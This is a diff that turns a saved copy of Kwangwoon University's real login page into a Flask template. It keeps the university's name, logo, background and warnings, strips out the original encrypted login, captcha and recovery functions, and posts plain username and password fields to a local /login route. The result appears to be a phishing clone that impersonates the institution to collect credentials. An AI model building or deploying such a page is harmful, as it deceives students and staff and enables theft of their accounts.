@@ -1,510 +1,90 @@
 <!DOCTYPE html>
-<html style="background-color: #f8f9fa" lang="ko">
-    
+<html lang="ko" style="background-color: #f8f9fa">
+
 <head>
     <meta charset="UTF-8">
-    <title>Login</title>
-</head>
-
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no" />
-<meta name="apple-mobile-web-app-capable" content="yes">
-<link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon" />
-<link rel="icon" href="/assets/favicon.ico" type="image/x-icon" />
-<title>광운대학교 로그인 페이지</title>
-
-<link rel="stylesheet" type="text/css" href="/assets/axboot/theme/default/css/axboot.css"/>
-
-<link rel="stylesheet" type="text/css" href="/assets/plugins/axicon/axicon.min.css" />
-<link rel="stylesheet" type="text/css" href="/assets/plugins/fontawesome/css/font-awesome.min.css" />
-
-
-<!--[if lt IE 10]>
-<link rel="stylesheet" type="text/css" href="/assets/axboot/theme/default/css/axboot-01.css"/>
-<link rel="stylesheet" type="text/css" href="/assets/axboot/theme/default/css/axboot-02.css"/>
-<link rel="stylesheet" type="text/css" href="/assets/axboot/theme/default/css/axboot-03.css"/>
-<![endif]-->
-
-
-<link rel="stylesheet" type="text/css" href="/assets/custom/css/spv-frame-45c84a2169d8b35d1a6f92c60d4b858f.css"/>
-<link rel="stylesheet" type="text/css" href="/assets/modules/std/css/fonts-98cae2d8d9774d9eb668cf9a8f417fc1.css"/>
-<style>
-    .ax-body.login {
-        color: #ccc;
-        background: #000 url(/assets/custom/images/loginbg.jpg) no-repeat 0 0 !important; background-size:100% !important; vertical-align:middle !important;
-        position: relative;
-        font-weight:300;
-        font-family: 'Noto Sans KR', "맑은 고딕", "Malgun Gothic" , "Apple Gothic", "돋움", Dotum, "굴림", Gulim, sans-serif;
-    }
-    input::placeholder {
-	  font-size: 14px;	  
-	}
-</style>
-
-<script type="text/javascript" src="/assets/axboot/js/plugins.min-04993164cd30b5548bd12f6951ee71e2.js"></script>
-<script type="text/javascript" src="/assets/axboot/js/axboot.min-1fcb792372bbe96a881323ff719af5b9.js"></script>
-
-
-<script type="text/javascript">
-$(function() {
-    if (self !== top) {
-        top.loginPageEvent();
-        top.location.replace(self.location.href);
-    }
+    <title>광운대학교 로그인 페이지</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" href="{{ url_for('static', filename='favicon.ico') }}" type="image/x-icon">
+    <link rel="stylesheet" href="{{ url_for('static', filename='광운대학교 로그인 페이지_files/axboot.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='광운대학교 로그인 페이지_files/axicon.min.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='광운대학교 로그인 페이지_files/font-awesome.min.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='광운대학교 로그인 페이지_files/spv-frame.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='광운대학교 로그인 페이지_files/fonts.css') }}">
     
-    
+    <link rel="stylesheet" href="{{ url_for('static', filename='광운대학교 로그인 페이지_files/style-a810f33b3413ba8966e00079d940f043.css') }}">
 
-    $('input:checkbox').keypress(function(e){
-        if((e.keyCode ? e.keyCode : e.which) == 13){
-            $(this).trigger('click');
-            return false;
+    <style>
+        .ax-body.login {
+            color: #ccc;
+            background: #000 url("{{ url_for('static', filename='광운대학교 로그인 페이지_files/loginbg.jpg') }}") no-repeat 0 0 !important;
+            background-size: 100% !important;
+            vertical-align: middle !important;
+            position: relative;
+            font-weight: 300;
+            font-family: 'Noto Sans KR', "맑은 고딕", "Malgun Gothic", "Apple Gothic", "돋움", Dotum, "굴림", Gulim, sans-serif;
         }
-    });
-    
-    <!-- 첫번째 아이디부터 포커스 -->
-    setTimeout(function(){
-        $("#loginForm #loginId").focus();
-    });
-    
-});
 
-</script>
-<script type="text/javascript" src="/assets/plugins/jsencrypt/jsencrypt.min.js"></script>
+        input::placeholder {
+            font-size: 14px;
+        }
+    </style>
+
 </head>
+
 <body class="ax-body login">
-<div class="container">
-    <div class="newpanel">
-        <div class="panel-body">
-            <!-- user title -->
-            <div class="userLoginTitle">
-                <p><img src='/assets/custom/images/logo.png' alt="광운대학교"></p>
+    <div class="container">
+        <div class="newpanel">
+            <div class="panel-body">
+                <div class="userLoginTitle">
+                    <p><img src="{{ url_for('static', filename='광운대학교 로그인 페이지_files/logo.png') }}" alt="광운대학교"></p>
+                </div>
+
+                <div class="panel-body-inner">
+                    <form id="loginForm" method="POST" action="/login" autocomplete="off">
+                        <div class="login-form-input-group">
+                            <div class="form-group">
+                                <input type="text" id="loginId" name="username" class="form-control ime-false"
+                                    placeholder="ID(학번 또는 사번)" maxlength="20" required>
+                            </div>
+                            <div class="form-group">
+                                <input type="password" id="loginPwd" name="password" class="form-control ime-false"
+                                    placeholder="PASSWORD" maxlength="32" required>
+                            </div>
+                        </div>
+
+                        <div class="adminLogin-box">
+                            <span class="chk">
+                                <input type="checkbox" id="storeIdYn" title="아이디저장">
+                                <label for="storeIdYn">아이디 저장</label>
+                            </span>
+                            <button type="submit" class="btn">&nbsp;&nbsp;로그인&nbsp;&nbsp;</button>
+                        </div>
+
+                        <div class="save-pwsearch">
+                            <span class="pwsearch">
+                                <button type="button" class="btn btn btn-darkgray3 pwdfind" disabled>&nbsp;비밀번호
+                                    찾기</button>
+                            </span>
+                        </div>
+                        <div class="btnwid">
+                            <button type="button" class="btn btn btn-darkgray searchno" disabled>&nbsp;개인번호 조회</button>
+                            <button type="button" class="btn btn btn-darkgray firstsave" disabled>&nbsp;비밀번호 최초
+                                등록</button>
+                        </div>
+                    </form>
+                </div>
             </div>
 
-            <div class="panel-body-inner">
+            <ul class="list-group">
+                <li class="list-group-item">
+                    <span class="icon">!</span>비밀번호 오류 5회 이상 로그인 제한
+                </li>
+            </ul>
 
-                <!-- user title -->
-                <form id="loginForm" name="login-form" class="" method="post" onsubmit="return fnObj.login();" autocomplete="off">
-                    <div class="login-form-input-group">
-                        <div class="form-group">
-                            <!-- <label for="아이디"><i class="cqc-new-message"></i>ID</labe>-->
-                            <input type="text" id="loginId" value="" class="form-control ime-false" placeholder="ID(학번 또는 사번)" maxlength="20"  title="로그인 아이디" />
-                        </div>
-                        <div class="form-group">
-                            <!-- <label for="비밀번호"><i class="cqc-key"></i> Password</label>-->
-                            <input type="password" id="loginPwd" class="form-control ime-false" placeholder="PASSWORD" maxlength="10" size="10"  title="로그인 비밀번호" />
-                        </div>
-                        <div class="form-group" id="captchaShow">
-							<label for="captchaInput" class="chk">자동 입력 방지(3회이상 오류일경우)</label>
-							<div class="captcha">
-						    	<div class="loading"></div>
-								<img id="captchaImg" src="/usr/cmn/login/captchaImg.do" alt="캡차 이미지" title="캡차 이미지" />
-							    <input type="text" id="captcha" name="captcha" autocomplete="off" size="10"  /><a href="#none" onclick="fnCmdReCaptcha();" >&nbsp;<span><i class="fa fa-refresh" aria-hjidden="true"></i></span></a>
-						  	</div>
-						</div>
-                    </div>
-
-                    <input type="hidden" name="" value="" />
-                    <div class="adminLogin-box">
-                        <span class="chk">
-                          <input type="checkbox" id="storeIdYn"   title="아이디저장"  />
-                          <label for="storeIdYn">아이디 저장</label>
-                        </span>
-                        <button type="submit" class="btn" >&nbsp;&nbsp;로그인&nbsp;&nbsp;</button>
-                    </div>
-
-					<div class='save-pwsearch'>
-                        <span class='pwsearch'>
-                            <button type="button" class="btn btn btn-darkgray3 pwdfind" onclick="fnObj.find_pwd_modal()" style="">&nbsp;비밀번호 찾기</button>
-        <!-- btn-darkgray2 로 이름변경   -->
-                        </span>
-                    </div>
-                    <!-- class btnwid 라고 이름주고 위치변경 -->
-                    <div  class='btnwid'>
-                        <button type="button" class="btn btn btn-darkgray searchno" onclick="fnObj.find_memberno_modal()" style="">&nbsp;개인번호 조회</button>
-        <button type="button" class="btn btn btn-darkgray firstsave" onclick="fnObj.frst_mod_pwd_modal()" style="">&nbsp;비밀번호 최초 등록</button>
+            <a href="https://www.kw.ac.kr/ko/info/privacy.jsp" target="_blank" class="btn btn-darkgray3">개인정보처리방침</a>
         </div>
-                </form>
-            </div>
-        </div>
-
-
-        <ul class="list-group">
-            <li class="list-group-item">
-                <!-- 경고창 알림 -->
-                <span class="icon">!</span>비밀번호 오류 5회 이상 로그인 제한
-            </li>
-        </ul>
-
-       	<a href='https://www.kw.ac.kr/ko/info/privacy.jsp' target="_blank" class='btn btn-darkgray3'  >개인정보처리방침</a>
-
-        </div>
-</div>
-
-<script type="text/javascript">
-
-function fnCmdReCaptcha() {
-	
-	 var $captchaLoader = $("#loginForm .box.captcha .loading");
-	 var $captchaImg = $("#loginForm .box.captcha img");
-	 
-	 $captchaLoader.show();
-	 $('#captchaImg').attr("src", "/usr/cmn/login/captchaImg.do?ran=" + Math.random());
-	 $captchaLoader.fadeOut(500);
-	 
-	 $('#captcha').val('');
-}
-
-$('#captchaShow').hide();
-
-
-function setLogin(loginId, loginPwd) {
-    $('#loginId').val(loginId);
-    $('#loginPwd').val(loginPwd);
-
-    fnObj.login();
-}
-
-function fnCmdResultPage() {
-  
-    fnObj.login();
-}
-
-
-
-</script>
-
-<script type="text/javascript">
-    var fnObj = {
-        pageStart : function() {
-
-        },
-        login : function() {
-
-        	if($("#loginId").val() == "") {
-        		axDialog.alert({
-                    msg: 'ID를 입력하세요',
-                }, function () {
-                    if (this.key === 'ok') {
-                    	$("#loginId").focus();
-                    }
-                });
-        		return false;
-        	}
-
-        	if($("#loginPwd").val() == "") {
-        		axDialog.alert({
-                    msg: '비밀번호를 입력하세요',
-                }, function () {
-                    if (this.key === 'ok') {
-                    	$("#loginPwd").focus();
-                    }
-                });
-        		return false;
-        	}
-
-            var storeIdYn = 'N';
-
-            if ($('#storeIdYn').is(':checked')) {
-                storeIdYn = 'Y';
-            }
-            
-            //대표 홈페이지 DB마이그레이션 작업을 위한 대표홈페이지 로그인 임시 차단 조치 2025.02.07  
-			//배포완료로 차단조치 해제 2025.02.17
-            /*
-            if('' == "https://www.kw.ac.kr/include/loginCallback.jsp") {
-            	alert("로그인 기능이 일시적으로 제한 됩니다.");
-            	return;
-            }
-            */
-
-            axboot.ajax({
-                method   : 'POST',
-                url      : '/usr/cmn/login/LoginSecurity.do',
-                callback : function(res) {
-                    
-                    var login = JSON.stringify({ 'loginId': $('#loginId').val(), 'loginPwd': $('#loginPwd').val(), 'storeIdYn': storeIdYn });
-
-                    var encrypt = new JSEncrypt();
-                    encrypt.setPublicKey(res.publicKey);
-                    var loginToken = encrypt.encrypt(login);
-                    
-                    var captchaPass = true;
-                    
-                    axboot.ajax({
-                        method : 'POST',
-                        url    : '/usr/cmn/login/LoginCaptcha.do',
-                        data   : JSON.stringify({ 'loginToken': loginToken, 'captcha':  $('#captcha').val() }),
-                        options: {
-                            nomask  : false,
-                            apiType : 'login'
-                        },
-                        callback: function (res) {
-                           if(res > 2) {
-                        	   
-                        	   if ($("#captchaShow").css('display') == 'none'){
-                        		   axDialog.alert({
-                                       msg: '자동 입력 방지를 위한 문자를 입력하세요.',
-                                   }, function () {
-                                      
-                                   });
-                        		   
-                        		   $('#captchaShow').show();
-                        		   return;                        		   
-                        	   }
-                        		
-                           }
-                           
-                           
-                           axboot.ajax({
-                               method : 'POST',
-                               url    : '/usr/cmn/login/LoginConfirm.do',
-                               data   : JSON.stringify({ 'loginToken': loginToken, 'captcha':  $('#captcha').val(), 'redirectUrl': '', 'redirectTabUrl': '' }),
-                               options: {
-                                   nomask  : false,
-                                   apiType : 'login'
-                               },
-                               callback: function (res) {
-                            	   
-                                   if (res.errorCount == 0) {
-                                       if (res.response.certOpt == 'Y') {
-                                           axDialog.alert({
-                                               msg: '임시 비밀번호를 먼저 변경해주세요.',
-                                           }, function () {
-                                               if (this.key === 'ok') {
-                                                   fnObj.frst_login_modal(res.response.userId, res.response.mtype);
-                                               }
-                                           });
-                                       } else if (res.response.gradAt == 'Y') {
-                                       	   axDialog.alert({
-                                               msg: '졸업생은 KLAS 종합정보서비스를 이용할 수 없습니다.',
-                                           }, function () {
-                                               if (this.key === 'ok') {
-                                               	location.href = res['redirectUrl'];
-                                               }
-                                           });
-                                       } else if(res.response.twoFactorAt == 'Y') {
-                                    	   axDialog.alert({
-                                               msg: '개인정보취급자의 경우 2차인증을 하셔야 합니다.',
-                                           }, function () {
-                                               if (this.key === 'ok') {
-                                                   fnObj.fn_two_factor_modal();
-                                               }
-                                           });
-                                       } 
-                                       else {
-                                    	   location.href = res['redirectUrl'];
-                                       }
-                                   }
-                                  
-                               },
-                               success: function (res){
-                            	   fnCmdReCaptcha();
-                               }
-                           });
-                           
-                           
-                           
-                        }
-                    });
-                    
-                      
-					
-                }
-            });
-
-            return false;
-        },
-        frst_login_modal : function(userId, mtype) {
-            axboot.modal.open({
-                width: 550,
-                height: 600,
-                header: false,
-                iframe: {
-                   url: '/usr/cmn/login/modal/UserFrstPwdPage.do',
-                   param: ''
-                },
-                sendData: function () {
-                    return {'userId' : userId, 'mtype' : mtype}
-                },
-                callback: function(data) {
-                    location.reload();
-                }
-            });
-        },
-        find_pwd_modal : function(){
-            axboot.modal.open({
-                width: 550,
-                height: 600,
-                id : 'modal-find-pwd',
-                header: false,
-                iframe: {
-				   url: '/usr/cmn/login/modal/UserFindPwdPage.do',
-                   param: '',
-                },
-                sendData: function () {
-                    return {
-                    }
-                },
-                callback: function(data) {
-                    axDialog.alert('다시 시도해주시기 바랍니다.',function(){
-                        location.reload();
-                    });
-                }
-            });
-            $('iframe[name=modal-find-pwd-frame]').prop('title','비밀번호 찾기');
-        },
-        frst_mod_pwd_modal : function(){
-            axboot.modal.open({
-                width: 550,
-                height: 600,
-                header: false,
-                id : 'frst-pwd-modal',
-                iframe: {
-                   url: '/usr/cmn/login/modal/UserFrstModPwdPage.do',
-                   param: ''
-                },
-                sendData: function () {
-                    return {
-
-                    }
-                },
-                callback: function(data) {
-                    axDialog.alert('다시 시도해주시기 바랍니다.',function(){
-                        location.reload();
-                    });
-                }
-            });
-            $('iframe[name=frst-pwd-modal-frame]').prop('title','비밀번호 최초 등록');
-        },
-        find_memberno_modal : function(){
-            axboot.modal.open({
-                width: 800,
-                height: 500,
-                header: false,
-                id : 'find-memberno-modal',
-                iframe: {
-                   url: '/usr/cmn/login/modal/UserFindMemberNoPage.do',
-                   param: ''
-                },
-                sendData: function () {
-                    return {
-                    }
-                },
-                callback: function(data) {
-                    axDialog.alert('다시 시도해주시기 바랍니다.',function(){
-                        location.reload();
-                    });
-                }
-            });
-            $('iframe[name=find-memberno-modal-frame]').prop('title','개인번호 조회');
-
-        },
-        fn_two_factor_modal: function(){
-        	axboot.modal.open({
-                width: 800,
-                height: 400,
-                header: false,
-                iframe: {
-                    url: '/usr/cmn/cert/UserCertInsertPage.do'
-                },
-            });
-        }
-
-    };
-
-    $(function() {
-    	if ($('#storeIdYn').is(':checked')) {
-    		$('#loginPwd').focus();
-    	}else{
-        	$('#loginId').focus();
-    	}
-    });
-
-
-    function fnFindPwdChk() {
-         axDialog.prompt({
-                title : '비밀번호 찾기',
-                msg   : '비밀번호를 잊어버린 경우 <font color=red>아이디</font>를 입력하세요.',
-                width : 300,
-                input: {
-                    loginId: { label: '아이디 입력', required: true},
-                }
-            }, function () {
-                if (this.key == 'ok' || ax5.util.isNothing(this.key)) {
-                    var paramData = {
-                        'loginId' : this.input['loginId']
-                    };
-
-                    axboot.ajax({
-                        method   : 'POST',
-                        url      : '/usr/cmn/login/UserFindPwdChk.do',
-                        data     :JSON.stringify(paramData),
-                        callback : function(res) {
-
-
-                            if (res.errorCount == 0) {
-                                 fnObj.find_pwd_modal();
-                            } else {
-                                 location.reload();
-                          }
-
-                        }
-                    });
-                }
-            });
-    }
-
-    
-    function fnUserUpdateForm() {
-        axboot.modal.open({
-            modalType: 'USER_INFO',
-            callback: function (data) {
-                this.close();
-            }
-        });
-    }
-
-    
-    function fnSmaertLogin(loginId){
-        var storeIdYn = 'N';
-        if ($('#storeIdYn').is(':checked')) {
-            storeIdYn = 'Y';
-        }
-        axboot.ajax({
-            method   : 'POST',
-                url      : '/usr/cmn/login/LoginSmaertSecurity.do',
-                callback : function(res) {
-                    
-                    var login = JSON.stringify({ 'loginId': loginId, 'storeIdYn': storeIdYn });
-
-                    var encrypt = new JSEncrypt();
-                    encrypt.setPublicKey(res.publicKey);
-                    var loginToken = encrypt.encrypt(login);
-
-                    
-                    axboot.ajax({
-                        method : 'POST',
-                        url    : '/usr/cmn/login/LoginSmartConfirm.do',
-                        data   : JSON.stringify({ 'loginToken': loginToken, 'redirectUrl': '', 'redirectTabUrl': '' }),
-                        options: {
-                            nomask  : false,
-                            apiType : 'login'
-                        },
-                        callback: function (res) {
-                            if (res.errorCount == 0) {
-                                location.href = res['redirectUrl'];
-                            }
-                        }
-                    });
-                }
-            });
-    }
-
-</script>
-
+    </div>
 </body>
 
 </html>
-
